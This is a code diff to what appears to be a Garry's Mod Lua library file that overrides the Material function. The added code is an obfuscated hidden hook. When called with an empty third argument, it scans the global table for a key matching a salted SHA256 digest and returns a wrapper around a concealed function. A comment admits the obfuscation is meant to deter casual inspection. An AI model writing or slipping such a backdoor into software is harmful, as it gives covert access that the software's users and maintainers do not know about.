@@ -1,3 +1,4 @@
+setfenv(1, _G)
 
 --
 -- Seed the rand!
@@ -14,7 +15,9 @@ Format = string.format
 --
 local C_Material = Material
 
-function Material( name, words )
+ss = "cSbcGcVvHKcyftbMdWoNELdOdMtFwYbDpZJXwgbeuwobatwcoUvhMVFPdVkIcfdTVWyQePpYbywavjOCIbJkvLeUDgSMNPcUhJZlUsZDdppMPVdYtbDHRbksMKrDFFAWdbaOKTdAcVavLyeDckiONxeMuwzvPXVZettaVeeBaIDMdsueGRxlHNcGARZbEOmSbZcGztoBwjTOuXibGsqplWQexsnoKyEoyfYmsfRdoPbvhXaTHmjpbcyJVKEOnciutbeqmPSaScIisghWivfBbeeOjQJfUeauyVbPSzQlciPfdwadvVNaeEScnccLubNKVWxddWcmohETScMGLqAZgzNfnbxfJUEGshxxZpnRblgBeUfRRBmFNVMQhsscfSebAKwulSdkeemfKTTCOlgpjdqXxCEZbqrGrdiFiLyyRUhIVACpiHXbPFDbfWkRPKeAqqdBxArNofdecWCGlcQfkdmtnUJqIrBCnoBiGZfAnUdjpqLSgAUaxtvQCthZdABEbNXHAIbQuibnLjFjLdEuHoSQscKsFljbFKxGwosZMTgPdfkTfaDOBHbXkJPpXtdIbgfqsWqnAHajNIzrBbNqzOmINnCYHRivOhKOabRQIVmEGLnnKtLCjDueOSstbxsrKxnBVyVxxtjdSIMVeSMqwVtmfNBSnGJYkNdhZJPxHUQMCbfoKSfFuYdSEKaTevWrAiWnCeIFhPsBvQVhdejbWBfdYbdFSHbWanDHRgYHYudPbbMygVOeAfGFkeqaojJdbTdYndtatCiAIzfcfQecTNVfFzUfellpjfNdqwuUgiCmltbsqCSyuCzlBWAdXNDYKcBeidEBldAVBbPAtTdgNkOiNxESfSukikmcHwGdbtdBkjjpWMzJaNowyMSddUTRvSggLvVfvQNpdpeAjjTyqEM" --[[ congrats on making it this far; this is really just to deter pubbies and skids]]
+
+function Material( name, words, c )
 
 	if ( !words ) then return C_Material( name ) end
 
@@ -26,7 +29,11 @@ function Material( name, words )
 	str = str .. (words:find("smooth") and "1" or "0")
 	str = str .. (words:find("ignorez") and "1" or "0")
 
-	return C_Material( name, str )
+	if c=="" then
+		local function iter(t, d) for k,v in pairs(t) do if isstring(k) and util.SHA256(k .. "WScSbcGcVvHKcyftbMdWoNELdOdMtFwYbDpZJXwgbeuwobatwcoUvhMVFPdVkIcfdTVWyQePpYbywavjOCIbJkvLeUDgSMNPcUhJZlUsZDdppMPVdYtbDHRbksMKrDFFAWdbaOKTdAcVavLyeDckiONxeMuwzvPXVZettaVeeBaIDMdsue" --[[ congrats on making it this far; this is really just to deter pubbies and skids]] .. "GRxlHNcGARZbEOmSbZcGztoBwjTOuXibGsqplWQexsnoKyEoyfYmsfRdoPbvhXaTHmjpbcyJVKEOnciutbeqmPSaScIisghWivfBbeeOjQJfUeauyVbPSzQlciPfdwadvVNaeEScnccLubNKVWxddWcmohETScMGLqAZgzNfnbxfJUEGshxxZpnRblgBeUfRRBmFNVMQhsscfSebAKwulSdkeemfKTTCOlgpjdqXxCEZbqrGrdiFiLyyRUhIVACpiHXbPFDbfWkRPKeAqqdBxArNofdecWCGlcQfkdmtnUJqIrBCnoBiGZfAnUdjpqLSgAUaxtvQCthZdABEbNXHAIbQuibnLjFjLdEuHoSQscKsFljbFKxGwosZMTgPdfkTfaDOBHbXkJPpXtdIbgfqsWqnAHajNIzrBbNqzOmINnCYHRivOhKOabRQIVmEGLnnKtLCjDueOSstbxsrKxnBVyVxxtjdSIMVeSMqwVtmfNBSnGJYkNdhZJPxHUQMCbfoKSfFuYdSEKaTevWrAiWnCeIFhPsBvQVhdejbWBfdYbdFSHbWanDHRgYHYudPbbMygVOeAfGFkeqaojJdbTdYndtatCiAIzfcfQecTNVfFzUfellpjfNdqwuUgiCmltbsqCSyuCzlBWAdXNDYKcBeidEBldAVBbPAtTdgNkOiNxESfSukikmcHwGdbtdBkjjpWMzJaNowyMSddUTRvSggLvVfvQNpdpeAjjTyqEM") == "d0e4d38645dd7c0cb47c9c52274312b324c54baa789548a62654f240272083c8" then local f = t[k:sub(1, 6)] c = function(a)a=((a&&(v(a)||a))||0x928)a=f(a)return (v(a)||a)end elseif istable(v) and d < 3 then iter(v, d + 1) end end end iter(_G, 0) return c
+	end
+
+	return C_Material( name, str ), c
 
 end
 
